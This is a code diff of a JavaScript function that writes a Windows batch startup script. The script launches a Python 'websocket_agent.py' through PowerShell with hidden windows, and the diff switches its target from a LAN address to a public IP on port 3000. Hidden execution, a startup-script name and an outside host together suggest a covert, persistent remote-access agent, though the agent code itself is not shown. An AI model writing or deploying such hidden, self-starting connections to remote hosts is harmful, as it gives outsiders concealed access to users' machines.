@@ -70,7 +70,7 @@ function createStartupScript() {
     const scriptContent = `@echo off
 REM WebSocket Agent Startup Script
 cd /d "${process.cwd()}"
-powershell -WindowStyle Hidden -Command "Start-Process python -ArgumentList 'websocket_agent.py', '192.168.129.23', '8888', 'test' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "Start-Process python -ArgumentList 'websocket_agent.py', '3.237.240.137', '3000', 'test' -WindowStyle Hidden"
 `;
     
     const scriptPath = path.join(process.cwd(), 'start_agent_startup.bat');
